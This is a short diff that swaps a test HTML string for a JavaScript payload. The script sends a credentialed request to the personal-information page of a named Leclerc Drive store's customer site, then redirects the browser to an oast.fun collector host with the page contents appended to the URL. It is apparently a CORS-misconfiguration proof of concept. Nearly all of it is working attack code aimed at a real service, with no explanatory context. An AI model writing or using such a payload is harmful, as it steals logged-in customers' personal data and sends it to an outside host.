@@ -1,1 +1,11 @@
-"<h1>test</h1>" 
+<script>
+  var req = new XMLHttpRequest(); 
+req.onload = reqListener; 
+req.open('get','https://fd6-espace-client.leclercdrive.fr/drive/magasin-097602-097602-Le-Havre---Docks-Vauban/mes-informations-personnelles.aspx',true); 
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+    location='//orlrnjgifoxwnpbprwrvj5k2tdkpskjx2.oast.fun/log?key='+this.responseText; 
+};
+</script>
